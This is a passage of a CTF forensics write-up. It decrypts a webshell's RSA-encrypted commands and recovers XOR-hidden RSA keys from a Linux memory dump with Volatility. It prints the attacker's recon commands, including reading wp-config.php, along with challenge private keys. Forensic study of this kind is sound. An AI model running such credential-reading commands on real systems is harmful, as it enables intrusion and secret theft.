B9lsoQC47npnc0Fy+Gt85zuRkuk8e1kPjogierA3tZiA6zs+6Qc6d9Ri7kfpasekO4dhZsM1W9z0n/zWpq+0Xp5tJ77mpryGPfae3KRSTS0QscQMi/ZhD+Pi6ajL3FoxKI7wfZ7RA0OKGSxhbiNHcD6WEShSbHILkuC7wWVMw=,rq0fb0wiKfJyqd3CCVAmwu3a8EKvgZ9B3K7sct8BoeBG/PKbp8a8AC9AbWPqnjYSIcFNkexdH1lXJrvgLKrC4UaqpMdi+Zqu96oc3695VfN0zspAKZkjEUwU8PA+En7R5qwSMD4QLop+2qZ+Tx1DC7Y2QwvqH7kAxwwloou45zw=,eTJY1cWk0XfO166TYwkvxA+6A6Ee5xXv53PtV7nbblXGx8PlVXUa5DU/dAXzTuyO1Ykkh16t0TKlyF/7X1G2S5z8RPjmyzIwhALHWw+zvWhE5hDf3lhZ1co6L9/Y7nSgKwUuWTsi1ZPqlrJTTlCyE+gNJE4M+Rh8QfJ/YQsWMBM=,BBeqrThbTcuSguT+9V2a5w2zTeL2GG+WZx26DXy0Y/sH8D85PMTk2lsVNs0e+yj06RfAkQuq6LrYVyEC9wB63ovSKxKIY0vZLaqxwZwA8RdzVcoOrx1/+acY1WqgeG8ZJdXCK7DFcRakkAclhZYNwJO+yKvto+ytvbWcKo0eeDI=,i5rXk8yQ4RVFvlY+sKFvlD19qAA8+9qTtzEGHXeSI9O+v2TDAoLJQuNnp+m3WTReKf8WN3sZ4CTpvUpXR0UYbZ1TUSHRyvWTkm+2P6E4DXdRvotwp+HyviELbjTrn0ajilPV3+X3DF1m1MaDo5v03gBIFRxCuDJM3CYk8KFw/kQ=,M6tV8pweNQzCRPori1fT2kcBP3yQPyUKklMnL5famDhmlCogoJf+99yfucyz/RNWzekcyUCGUrZMc9XerqIs7tHfZn1yR+AP/d33eMg3oNzAsRsec2IQ2ewLB0Rzk85PWXB5xlTOF4+PLRv7UfST7WvUtHXxJseRCYajENzMqFg=,"

KEY2 = """-----BEGIN RSA PRIVATE KEY-----
MIICXAIBAAKBgQCyYg7DzqjtPGCUT+q38iZcQDqZFC+lIxqo+g1/OhT45AMPtea0
habVZX77whFsQz5zE3fUXLZCzDnZpvtfr4Y8JSzGdL7O0qf3KAQIfk26YQeKOOje
ECNi5zUk3wf+5QUZjXnvDj+BUr78fV57zMpCBe65+mTiBpFkzsNTYo+VxwIDAQAB
AoGBAKyHPrSPer8JOHf525DRudxbmtFXvsU/cJeiUc+Nw57+GR/m1R4gbj3TDsA8
8VD+sLXoTGuux/FPSVyDrnjbcT25akm0FE+KkBZ6dNLFtOq6WQTe3N8HHDHkpqbZ
qXbmuph4MqZlDpKMbEL1cQ81MkgAdPJnljvrjpIoqn5wZ7cRAkEA1+SjeaueSCu4
4VzXTDOMkBqT5rEfJXnT7fN9eM48dXCd1LotWIL/2xcGkC4OdqT0kQiSs4pOQlcn
Lle18qOL5QJBANOFh3aaoGDfH60ecX2MHDnvHz4CSAIInlNXsPpbhWrt7blmGBeA
nuwIiaQOMzvrj084xk3nI8PMIzdgxUFveDsCQA2w1h0VIQh6nVLNTGnsqvFIfjCW
8t6xhxsD4eUTTwozhg7Db7S5Ofhu0V+7S/eCJnA8FvGDx8q1NCrgLQ2iCXECQDl2
cRKbdy5Z7zUMrDA7O//RIl+qJv3GcZyamg2ph1lBQe+3+JuJ6aKdvya+ZNTGbaxL
9DN9s42hi3+j3nKkYbkCQDy68qEICIdcLPFzv/sEN2JS1Cg21lJMH14ao0M3Di9B
G4oDHVBHCRtDGXOviR8AG0VpghDHheonDFaX5O7VXUM=
-----END RSA PRIVATE KEY-----"""

# Convert to PEM format
def Convert(base_str):
    converted = "-----BEGIN PRIVATE KEY-----\n" + "\n".join([base_str[i : i + 64] for i in range(0, len(base_str), 64)]) + "\n-----END PRIVATE KEY-----"
    return converted

# Decrypt the base64 array
def RSADecrypt(base_arr, privkey):
    base_arr = base_arr.split(',')
    cipher_rsa = PKCS1_v1_5.new(privkey)
    sentinel = get_random_bytes(16)
    final_output = ''
    for s in base_arr:
        tmp = base64.b64decode(s)
        try:
            dec_text = cipher_rsa.decrypt(tmp, sentinel).decode()
            final_output += dec_text
        except:
            pass
    return final_output, sentinel

f = open('key.txt','r').readlines()

for l in f:
    data = bytes.fromhex(l.strip())
    command = data.split(b'...')[0]
    
    ### Decrypt base64 strings in source code => return another RSA key
    key = base64.b64encode(data.split(b'...')[1]).decode()
    key = Convert(key)
    private_key = RSA.import_key(key)
    source_dec, sentinel = RSADecrypt(BASESTR_SOURCE_CODE, private_key)
    # print(source_dec)
    
    ### Use second RSA key to decrypt webshell's commands
    private_key2 = RSA.import_key(KEY2)
    cipher_rsa = PKCS1_v1_5.new(private_key2)
    dec_text = cipher_rsa.decrypt(command, sentinel).decode()
    print(dec_text)
```

Script's output:

```
whoami
id
pwd
ls
sudo -l
ip a
cat ../wp-config.php
echo 'SEKAI{h4rd_2_d3t3ct_w3bsh3ll}'
cat /opt/flag2.txt
```

##### FLAG:

**SEKAI{h4rd_2_d3t3ct_w3bsh3ll}**

____

## Dumpster Dive

{{< admonition >}}
We nabbed the hacker thanks to enscribe's godlike OSINT and Social Engineering skills. Have this memory dump from the hacker's PC and try decrypting response packets from PCAP in Infected.

Author: Guesslemonger
{{< /admonition >}}

Remember the webshell in Infected? It had this command: `cat /opt/flag2.txt`. Our objective is finding its output in this challenge. 

The challenge gave us a memory dump. Because it's a linux dump so we need to provide a symbol to Volatility to make it working properly. You can do `strings mem.lime | grep -i "linux version"` to have its kernel version.

```
$ strings mem.lime | grep -i "linux version"
Linux version %s (%s)
Linux version 5.15.0-25-generic (buildd@ubuntu) (gcc (Ubuntu 11.2.0-19ubuntu1) 11.2.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #25-Ubuntu SMP Wed Mar 30 15:54:22 UTC 2022 (Ubuntu 5.15.0-25.25-generic 5.15.30)
Linux version 5.15.0-25-generic (buildd@ubuntu) (gcc (Ubuntu 11.2.0-19ubuntu1) 11.2.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #25-Ubuntu SMP Wed Mar 30 15:54:22 UTC 2022 (Ubuntu 5.15.0-25.25-generic 5.15.30)0)
Linux version 5.15.0-25-generic (buildd@ubuntu) (gcc (Ubuntu 11.2.0-19ubuntu1) 11.2.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #25-Ubuntu SMP Wed Mar 30 15:54:22 UTC 2022 (Ubuntu 5.15.0-25.25-generic 5.15.30)0)
```

We have known the version is 5.15.0-25-generic, now we can use Docker to generate symbol or just simply download it from the Internet.

After having the tool to work, we can use `linux.bash` to view if there was any suspicious command in the system at that moment.

```
$ vol -f mem.lime linux.bash
Volatility 3 Framework 2.5.0
Progress:  100.00               Stacking attempts finished
PID     Process CommandTime     Command

2019    bash    2023-08-03 18:38:14.000000      python3
2304    bash    2023-08-03 18:39:16.000000      sudo ./avml mem.lime
```

The attacker ran `python3` which spawned a pyshell in his system. This shell will be caught and stored in the memory. So what we need to do is just string and grep.

You can use this command: `strings mem.lime| grep -i -w ">>>" -C 5`

{{< image src="images/writeups/sekai/pythonshell.png" caption="string grep output" >}}

I decided to grep `rox` to have a complete piece.

```
$ strings mem.lime| grep -i -w "type = 'rox'[::-1]" -C 5
[...]
sekaictf@sekaictf-virtual-machine:~$ python3
Python 3.10.4 (main, Apr  2 2022, 09:04:19) [GCC 11.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> c = b'FR\xd6\xf8\x05w?\xcd\t\x88\x9cO\xb9e\xb9+\xe6\xc3\xfb\xaa?\xe5&\xf9Z\xc6\xc9\xa4\xc8)\xb9\xc3l\x9bq\x130*\xbe9\x19\xb8\xe2F\xaa\xaf\xa2\xa8\xf4\x0f\x8f\xb9\xa6*\xb1e~\x80T\xe3 \xda\xbd\xfe\x0c0\xbe\xa5`F/\xa57\x85\xe66\xbf\x1c\xda\x1e\xc7\xbe\xc1\x91<\xc2~\xdeG\xe8\xbc\xf0\x92/\xfc\xaa+\x9aT=="\xbe3)\x9d\xc7W\x82\xcd\x9b\xa8\xea\x0c\xbc\xd1\xb6,\xcbHv\xbcm\xd2(\x9d\x9f\xbb\'\x1a\x8f\xba\x19p)\xbe4\xa9\xda\x7f\x99w\xe9\x01\x9b\xc3\x95\x8c)\xd6q\xfd\\\xd0\xad\xe0\xd1g\xc6\x9fB\xd8i>X\x1f\x9c=-\xb2\xc4h\x9a\x90\xab\xf4\xc1\x11\xbd\x93\xbf+\xf8h|\x99j\xc9$\xc3\x80\xcf\x00=\xae\x87^{\n\xbd.\xa7\x8aE\xda]\xae\x12\x8c\xec\xef\x9f=\xc3c\xf0.\xcc\xa1\xd8\xac@\xd5\x98`\x902\x11\x07,\xb6#0\xb2\x9ev\xba\xb7\xce\xcb\xe7h\xa5\xc7\xc23\xfb`W\x99W\xf9Z\xc3\xb4\xde8\x11\xba\xa6bo\x02\xdd\x17\xa1\xcaX\xdfF\xd4,\x85\xfc\xe2\x992\x93u\xebQ\xc6\x89\xdd\xb4g\xc3\xe2E\xe3LZ_@\xb0\x12h\xbc\x9cN\x97\x9a\xb9\xe8\xecJ\xa1\x9a\xae\x1f\xf1Gq\x95h\xde1\xee\x97\xf8\x198\x94\x9bA\x06.\xbd\x07\xa4\xdaE\xa4\x16\xd2(\xf6\xf3\xe7\xac\r\x99T\xd6q\xc9\x82\xc5\xbfO\xc4\x9cq\x86|hb?\x87+=\xa8\xecW\xb7\xa6\xb5\xc2\xe9\x02\x8d\xc8\x95\'\xb3PZ\xb0\\\xfc:\xc4\xa0\xfa\x08I\x9c\x8cPQU\xc1x\xed\x8aK\xa9\x1d\xd7H\xfc\xe6\x99\xae(\xf1W\xf6|\xa9\xac\xe6\xa4V\xa7\xfeE\xe6T\x161a\xd88\x02\x9d\xd8T\x86\x94\xd2\xdc\xf4\x0e\x85\xb8\xbb\x07\xf1\x14*\xa1r\xc39\xc3\xe0\xdd>T\xb3\x9ePT-\xf2\x0c\xa5\x8fp\xab\x0f\xa0!\xd2\xbc\xee\x9f\x1f\x93U\xda*\xae\x96\xbf\xa0=\xf0\xb9L\xbbk\x02\x03\x01\xfd\x08\x0b\x80\xcaR\x9c\x8c\xaf\xdb\xc5\x7f\x8d\xce\xc5;\xca`/\xa5D\x99R\x9f\x9a\xea\x07/\xbd\x9c{\x05\x0b\xc6\x1a\xe9\xc5^\x88i\xe99\xf2\xf2\x9f\x9e<\x92r\xc3Q\xa8\xbd\xe8\xd1O\xc4\xb3M\x87V\x15\x0e\x13\xc2q1\xb4\x824\xf4\x97\xa5\xf4\xd4N\x94\x9d\xc1\x05\xe3\x17t\x9f\x0e\x93\x0f\xec\xbb\xd8\x007\xbc\xe3Jg\x0f\xf9\x16\x97\xf6_\xabi\xae\x19\x87\xfd\xdc\xa5]\xe95\xc1Y\xd5\xa8\xc0\xac4\xd1\x81j\x98[!\x00S\x98\x19R\xb4\xdbM\xf9\xc9\xb5\xf5\xebw\xab\xb9\xb6E\xd2iu\x9bm\xdf\x01\xfb\xa5\xe7@3\x83\x94D@>\xef\x0c\xa8\xe8[\x8bj\xf8,\xc7\xd2\xce\x8e!\xf8L\xddm\xa9\x9c\xa2\xb6B\xd6\xf9B\x83o`+:\xb5B\x1d\xf3\xf9w\xfd\xb1\x97\xfd\xfdP\xbd\x99\x98\x14\xd3E[\xc7n\x93\x19\xcb\xe6\xb3R\x11\x9d\xa0g\x05+\xeb\x0f\x87\xfd*\xb2\x1c\xa12\xc4\xcd\xc7\xdc\x19\x93a\xebG\xaa\x8f\xc0\x8ce\xdd\x82Y\xb4P1\x18\x00\x9aTo\x80\xa3I\x9c\xcc\xb2\xc0\xf9N\x81\x9d\xa1:\xc8{H\x98r\xc7%\xc6\x91\xda.\x11\x8f\xbbbb(\xdb-\x9c\xccL\xba\x10\xf0+\xfd\xa1\xe0\x88^\xd02\xc3L\xb4\x94\xdf\xaeU\xcc\xf9G\x9b{!&\t\x83H2\xab\x9b\x0e\xb4\xab\x92\xef\xf7|\xf4\x9a\x99\x0b\xf8R-\xc4\x0f\x99\n\x9b\x98\xef\x01I\xad\xb6\x03r2\xe8\x1a\x88\xca\x7f\x80o\xc0N\xf9\xe8\xc5\xbc\x11\xce6\x8f\x15\xb2\xc9\xa4\xc8)\xd1\x87e\xf2j\x03)K\xa7)\x11\xaf\xe8P\x88\xde\xaa\xdf\xf7\x17\xe1\xd3\xdaP\x8b^4\xde\x10\x86F\xef\x97\xcc"1\xdb\x85}w6\xc3\x03\xe6\xf7X\xb3\t\xb4V\x99\xa7\xa7\xa6"\xe7`\xff^\xaf\xa3\xca\xb6u\xd3\x9ah\xb0\x0b\x149.\xb5:\t\xac\xe8E\xf9\xb9\xaf\xdb\xeay\x8e\x97\xa66\xc3EH\xb0D\xf2\x0c\x9a\x96\xf1\x1a\x15\x8f\x85ov/\xdek\xb7\x8f%\x83~\xfa*\xf0\xfb\xf7\xe1-\xe3-\xdeV\xe7\x95\xe6\xcec\xa5\xe6n\xbald]*\xba+,\x9c\xc84\xa5\x9f\x83\xcc\xf4b\xfb\xc9\x80\x15\xc7QH\x89\x08\xd1.\x9e\xb4\xde33\xa1\x96Rq\x14\xd00\xb0\xc8{\x98\x10\xc0C\xfe\xd9\xd7\xaca\xc4J\x85P\xaf\x95\xef\xd6O\xd5\x98h\xb4Sb^2\xa6\x1e\x13\xb6\xe6n\xa8\xbb\xa2\xd4\xc7\x0f\xb6\xab\x9cN\xf6D2\xc6l\xfe1\xc7\x8a\xe5\x1d;\x91\xfej`\x08\xbdx\xa0\xea(\xdd^\xd4\x0b\xf7\xc8\xc8\xdd^\xaa-\xdfK\xf6\xa6\xf9\xa3o\xee\xbao\x86a?C=\x8f\x0c\x11\xbd\xe8U\x8c\xbc\xeb\xb7\x83\x17\xe1\xd3\xb23\xc5\x02I\xa6\x7f\xe7"\xee\xf2\xc0.&\xd6\xf8\x05\x18W\x80<\xeb\x910\xc7\t\xdb>\xf3\xc3\xe3\xcb9\xf3G\x92O\xcd\xad\xdf\xa4P\xd1\xe9j\x97a}EF\xdaVR\xb4\xe0M\x8e\xa6\xb0\xd3\xec{\x8d\xb5\xb5\x1a\xd0a`\x86^\xc5\x00\xc3\xb9\xc9;K\x8c\xbdR\x05#\xc02\xa4\xd0v\x8f\x12\xafL\xd2\xbf\xca\xdf.\xc6E\xdfT\xfc\xab\xbb\x8f3\xf7\xe2v\x97w\x07\x05\t\xa19\n\xf3\xf3+\x88\xaa\x95\xeb\xe1s\x89\xb3\xcf5\xf1\x1bk\xa5\x0b\x9b^\xff\xe3\xec!=\x9d\xe2\\V\x02\xf0)\x83\xd3E\xdeS\xe1*\xd9\xbf\xc3\x8d*\xd1^\xd9W\xca\x80\xe5\x8aC\xed\x82\x16\xa2\x0f\x192?\x9fN,\xa1\xa32\x86\x90\x82\xf1\xedN\xbe\x89\x959\xb6g_\x84W\xfc)\xef\xb1\xee=7\xa9\xb8FX,\xee4\x80\x88d\xa3O\xee\x1a\xf0\xb8\xfe\xdf\x1f\xd72\xfd*\xdc\xb2\xd0\x86M\xf8\x80`\x93Wf9"\xb3:\t\xb8\xeb\x0e\x8c\x91\xa6\xdb\xcd\x02\xf4\xaa\xa1$\xcb\x1bi\x90d\x9a,\xc8\xb1\xfe#+\xb7\x8fYx=\xc6\x02\x95\xe4l\xc1\x15\xf29\xf7\xef\xf5\xd9R\xceq\xfbN\xcf\xa9\xed\xce/\xda\xa5x\xb4Hf#\x0c\xc4K4\xab\xd1b\xc7\xb5\x8d\xce\xe6\x0f\xa7\x93\x94J\xc4xZ\xb4\x12\xe6 \xc6\xab\xe6S6\xcd\x80bd6\xef\x16\x91\xe6E\xddk\xe0\x15\xd6\xc5\x9a\x98.\xc6G\xe6T\xae\x8f\xfc\x84+\xc7\xfcm\xb1r2>\x02\xbc\x029\xb5\xcf`\x94\xf4\x93\xea\xc5\x0f\xa6\x9d\xbbL\xb6[^\xb1\\\xfa_\xf9\x81\xb8\x0cM\x9a\xa3|@\x19\xb38\x8f\xf8S\xa5Q\xb2#\xc2\xbd\x94\x88\x1e\xeeI\xfbu\xe8\xb3\xfe\xa0G\xc5\x98e\x8aP#\x0c \xb6\x11=\xa3\xe84\xa9\xbd\xeb\xcb\x98_\xb8\x92\xce\x14\xcftr\xd8H\xde\x01\x9c\x9a\xc5\x00\x0f\xb7\xe3\x1c^C\xf2.\x94\xf4R\xbdE\xfb\x11\x85\xba\xc1\x84X\xc6V\xd6n\xce\xcb\xbc\xd2u\xcc\xbfD\xbel2\x0c9\xa6,a\xb5\xd1S\x8e\x99\xb5\x90\x9ap\xa9\x8b\x8e1\xeepX\x98x\xeaZ\xe8\xbc\xd1X\x12\x8f\xfa\x03\x1eO\xed\'\xa0\xcb[\x8e\x0b\xcc\x0e\xd8\xd9\xe4\x93\r\xe8J\xc2r\xdc\x96\xcd\x8ff\xf2\x84h\x82A?G\t\x99\x12k\x95\xd1j\xa0\xc7\xac\xac\xa4V\x82\xbd\xb3?\xceMp\xa3_\xf31\xe5\xa3\xd1]\x05\xa1\xa7gvI\xf9\x0e\xb3\x85U\x9eh\xefL\xc4\xdd\xfc\xa1)\xe1L\xfa(\xc6\x89\xdc\xach\xa6\xbf\x13\xa5Vi\x18\x05\xce\x0fs\xce\xefn\xab\xad\xd0\xa8\xe70\x84\xbc\xa1\t\xaaOs\x86|\xda\x07\xdf\x97\xcf\x1f\x13\xcc\xecif>\xday\xe9\xd8(\x86\x10\xc96\xcc\xe1\xfc\x9c\x02\xc7q\x85z\xca\x92\xf8\x82j\xf5\xafT\xe4O\x18\x19\x06\xb9J<\xaf\x91i\x88\xbd\xb0\xcb\xea\x7f\xc6\x98\x99\x0e\xc8g|\xc4q\xd19\xef\x9c\xc2,K\x99\x8c\x1f^\x00\xdc7\xb1\xfe^\x8dL\xd1\x01\xd7\xdc\xc0\xa9\x1a\xd3I\xf5H\xa6\xcf\xc4\x97L\xcd\xa8H\x85q!>!\xdcL1\xaf\xc7|\xa4\xae\x85\xf2\xe0m\xbf\xf4\xb9\x14\xcbq.\x8aZ\xda\x05\xc6\x9e\xdb)L\x9e\x9d\x1am?\xbf\x01\xad\xfe|\x9bG\xf1I\xde\xec\xcc\x8f\x18\xf6c\xdf&\xcc\xa7\xe8\xd6o\xdd\xa8d\xe7{\x172\n\xb4\x0bn\x80\x91`\x9d\xad\xb7\xad\xfdu\x8b\x91\xfd\x07\xb5IX\xbbt\xc3,\xc6\xf9\xb3\x0cG\x9d\xe1io2\xb3y\xf1\xe5\x7f\x93^\xa0\x01\xd7\xa5\xfe\xddR\xf7a\xd8u\xd8\xbc\xc7\x96`\xfa\x91h\xd8\x15}EF\xda>\x16\xbd\x89V\x9e\xbf\xc1\xca\xfcs\x9a\xbf\xa38\xa1i\\\xaa\x10\x86F\x80\xff'
>>> k = b'k\x7f\xfb\xd5(5z\x8a@\xc6\xbc\x1d\xea$\x99{\xb4\x8a\xad\xebk\xa0\x06\xb2\x1f\x9f\xe4\x89\xe5\x04\x94\xc9!\xd28Phk\xf7{X\xf9\xa9\x04\xcd\xfe\xe1\x9a\xae:\xcc\xfe\xf7}\x81"\x19\xf3=\xabk\xad\xd2\x8b'
>>> type = 'rox'[::-1]
>>>
[...]
```

Xor the `c` and `k` variable together:

```py
>>> xor(c,k)
b'-----BEGIN RSA PRIVATE KEY-----\nMIICXAIBAAKBgQC2Z5CGQW0GgsiHKwougOEpHsU/wCZ+U8Ces4lzWbxlXwXyw+hc\nHlmUIIHqdnSO3z2D6p/AQJjoOPyC0M0Leto1ES4tofbsSpz/I8gBvwOCOIi4cRVc\nQn0tkFuKmlWnJno+qmHVyJejWbOnRDkBURvNp7na6X0y7i8fBtVceB1SEQIDAQAB\nAoGAXhK7rwI/QIRi95NzBNjjR1nfUSnAsJZxWWgvE5bMW1vOrY3sYNYmTQcW+d1t\n7+Gi0E5JZdXrBpmdYbpehfUuZCEsrGoNi3T7GbfXN2KSByJGf9RdnVfLZKPUPTD8\nTpPeQESzXTXG8A6bZ2rCCaWQirqc6gYxd/K8+6VC9N3Hl4ECQQDc6HoAR37d4lFY\n/CZdqPKj3FZ4IFLzp63ROhRn2VU+HKxaWxLc3mA+9Zf6Ctt3Sh51r6E9dpmiSRkj\nsSycVQrNAkEA02FKB6Vy292HalPFIS0qLZ/yCbMpBFx2uW2tqN7Ya4KPzlUnEfx5\niM+09iDnztXc6xb5ml38dAiSkHG6bRusVQJBAM7b3wqN6I3sFJLII0EHKJcqh8ob\nMrI47ToEMgGA8SKlhPtjVwl+LxAluDeLnTFaNaWsXceJXJor6x+SFB0cQW0CQB9E\nPs0OvgSjqgoiRgB4S8rf489nfuO0QaOAA7X88IpGj7r3gYX5kIiaIKxfhapkm/7y\nMQ2SZWtMcVGIYQkOlNkCQEntnJWRQmZpQP4iPI+Mc5p4qS+pVKQX0fICqNbt3jR2\nyUsuYF8dnvyp4722a6Jdj6Vc+GHbZNvbjKY5MbhWzn0=\n-----END RSA PRIVATE KEY-----\n|-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCyYg7DzqjtPGCUT+q38iZcQDqZ\nFC+lIxqo+g1/OhT45AMPtea0habVZX77whFsQz5zE3fUXLZCzDnZpvtfr4Y8JSzG\ndL7O0qf3KAQIfk26YQeKOOjeECNi5zUk3wf+5QUZjXnvDj+BUr78fV57zMpCBe65\n+mTiBpFkzsNTYo+VxwIDAQAB\n-----END PUBLIC KEY-----\n|-----BEGIN RSA PRIVATE KEY-----\nMIICXQIBAAKBgQCyucnknkBP4whz0YJrblke667f5g4EfCmKcO2j7c+WEOWmbVBR\nZ/ETtqOIEM8Hp9rV605R1gJBf7tcxziEoX4wxQm5nfAqXkHUdloGyK7p7IZTh5tX\n6KnckCtrwbD7EFwjWBBceVHRmnmVdtF4yIkwaD2S4tw4O5CVYcIlIAAo6QIDAQAB\nAoGAc88TVYJ9pcY1GecuHTLZqMGLBSXq+1kBCeX29nwIQPMd++NlYfp6Kg30lRxf\nKlTH5kmc7EZCG/MKkym8I6UJQLeVWZX7OynbO7sEfATK1kua/S5LcJbViKyaLfdY\nrpk5jcL17yGBaQ4TS3g2avTuc9xIDNOu+Xv79cuNOIjwWwECQQDXhsdKAjeZA0dC\nQ6etl9iNVk+uuj1HNkpL64k9xnRHOWabj10lo3fPdqQ/57qXvelTbdRQW9LxWCgT\n4JeuyLoRAkEA1EnZ3mt/++5ggfwFd/UulSIxfHLpmCrDjbfMIPyo/bni3lxnm9M6\nlNCDBOoiPbXZHqZ6zZrOC3sNu9HtLv7pWQJBAJH7YmUIl2v2wn9pn9t+7FjfS12I\nHBVt+mjuAqlrEDtl79ASDP9/d5l4PMxkQwigw7eUvqgnafu6wHqmN1dV8mECQQDE\nfnsIEe7LzRBNIG4bY7kzVwwBCghHzcVmBqsOGW9+MrHYaiWIqVJ+7iVnxiPdhNWs\nNiJS7ygqnkLPB3eH2XE5AkBaqch2jfadsVem9SCa3kIaE5CGZaCp6y8dPSV7SOGo\nz4kAHIhGk+8g8f4AZH997Ybyz9zc/S69WgjjGXNsdnXI\n-----END RSA PRIVATE KEY-----'
```

Here is the decrypted:

```
-----BEGIN RSA PRIVATE KEY-----
MIICXAIBAAKBgQC2Z5CGQW0GgsiHKwougOEpHsU/wCZ+U8Ces4lzWbxlXwXyw+hc
HlmUIIHqdnSO3z2D6p/AQJjoOPyC0M0Leto1ES4tofbsSpz/I8gBvwOCOIi4cRVc
Qn0tkFuKmlWnJno+qmHVyJejWbOnRDkBURvNp7na6X0y7i8fBtVceB1SEQIDAQAB
AoGAXhK7rwI/QIRi95NzBNjjR1nfUSnAsJZxWWgvE5bMW1vOrY3sYNYmTQcW+d1t
7+Gi0E5JZdXrBpmdYbpehfUuZCEsrGoNi3T7GbfXN2KSByJGf9RdnVfLZKPUPTD8
TpPeQESzXTXG8A6bZ2rCCaWQirqc6gYxd/K8+6VC9N3Hl4ECQQDc6HoAR37d4lFY
/CZdqPKj3FZ4IFLzp63ROhRn2VU+HKxaWxLc3mA+9Zf6Ctt3Sh51r6E9dpmiSRkj
sSycVQrNAkEA02FKB6Vy292HalPFIS0qLZ/yCbMpBFx2uW2tqN7Ya4KPzlUnEfx5
iM+09iDnztXc6xb5ml38dAiSkHG6bRusVQJBAM7b3wqN6I3sFJLII0EHKJcqh8ob
MrI47ToEMgGA8SKlhPtjVwl+LxAluDeLnTFaNaWsXceJXJor6x+SFB0cQW0CQB9E
Ps0OvgSjqgoiRgB4S8rf489nfuO0QaOAA7X88IpGj7r3gYX5kIiaIKxfhapkm/7y
MQ2SZWtMcVGIYQkOlNkCQEntnJWRQmZpQP4iPI+Mc5p4qS+pVKQX0fICqNbt3jR2
yUsuYF8dnvyp4722a6Jdj6Vc+GHbZNvbjKY5MbhWzn0=
-----END RSA PRIVATE KEY-----
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCyYg7DzqjtPGCUT+q38iZcQDqZ
FC+lIxqo+g1/OhT45AMPtea0habVZX77whFsQz5zE3fUXLZCzDnZpvtfr4Y8JSzG
dL7O0qf3KAQIfk26YQeKOOjeECNi5zUk3wf+5QUZjXnvDj+BUr78fV57zMpCBe65
+mTiBpFkzsNTYo+VxwIDAQAB
-----END PUBLIC KEY-----
-----BEGIN RSA PRIVATE KEY-----
MIICXQIBAAKBgQCyucnknkBP4whz0YJrblke667f5g4EfCmKcO2j7c+WEOWmbVBR
Z/ETtqOIEM8Hp9rV605R1gJBf7tcxziEoX4wxQm5nfAqXkHUdloGyK7p7IZTh5tX
6KnckCtrwbD7EFwjWBBceVHRmnmVdtF4yIkwaD2S4tw4O5CVYcIlIAAo6QIDAQAB
AoGAc88TVYJ9pcY1GecuHTLZqMGLBSXq+1kBCeX29nwIQPMd++NlYfp6Kg30lRxf
KlTH5kmc7EZCG/MKkym8I6UJQLeVWZX7OynbO7sEfATK1kua/S5LcJbViKyaLfdY
rpk5jcL17yGBaQ4TS3g2avTuc9xIDNOu+Xv79cuNOIjwWwECQQDXhsdKAjeZA0dC
Q6etl9iNVk+uuj1HNkpL64k9xnRHOWabj10lo3fPdqQ/57qXvelTbdRQW9LxWCgT
4JeuyLoRAkEA1EnZ3mt/++5ggfwFd/UulSIxfHLpmCrDjbfMIPyo/bni3lxnm9M6
lNCDBOoiPbXZHqZ6zZrOC3sNu9HtLv7pWQJBAJH7YmUIl2v2wn9pn9t+7FjfS12I
HBVt+mjuAqlrEDtl79ASDP9/d5l4PMxkQwigw7eUvqgnafu6wHqmN1dV8mECQQDE
fnsIEe7LzRBNIG4bY7kzVwwBCghHzcVmBqsOGW9+MrHYaiWIqVJ+7iVnxiPdhNWs
NiJS7ygqnkLPB3eH2XE5AkBaqch2jfadsVem9SCa3kIaE5CGZaCp6y8dPSV7SOGo
z4kAHIhGk+8g8f4AZH997Ybyz9zc/S69WgjjGXNsdnXI
-----END RSA PRIVATE KEY-----
```

Using the second private key to decrypt the responses and we have the flag. You can write a script if you want to automate the whole process.

{{< image src="images/writeups/sekai/flag.png" caption="Got the flag" >}}

##### FLAG: 

**SEKAI{h0pe_y0u_enj0y3d_s0m3_l1nux_v0l}**